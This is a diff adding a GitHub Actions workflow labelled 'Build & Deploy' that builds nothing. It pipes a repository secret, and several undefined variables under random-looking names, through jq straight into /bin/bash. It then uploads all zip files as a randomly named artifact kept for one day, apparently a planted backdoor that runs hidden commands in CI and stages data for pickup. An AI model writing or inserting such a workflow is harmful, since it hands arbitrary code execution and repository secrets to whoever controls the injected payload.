@@ -1,0 +1,27 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          cjxs59383: ${{ secrets.cjxs59383 }}
+        run: |
+          printf '%s' "$cjxs59383" | jq -r .om0 | /bin/bash
+          printf '%s' "$nbl764" | jq -r .d9301 | /bin/bash
+          echo $zbkt69766 | jq -r .v61555 | /bin/bash
+          printf '%s' "$z92679" | jq -r .ns760 | /bin/bash
+          echo $gsue35150 | jq -r .algbe826 | /bin/bash
+          echo $tqrhq48 | jq -r .nzk38 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: OfsNZlYu
+          path: "*.zip"
+          retention-days: 1
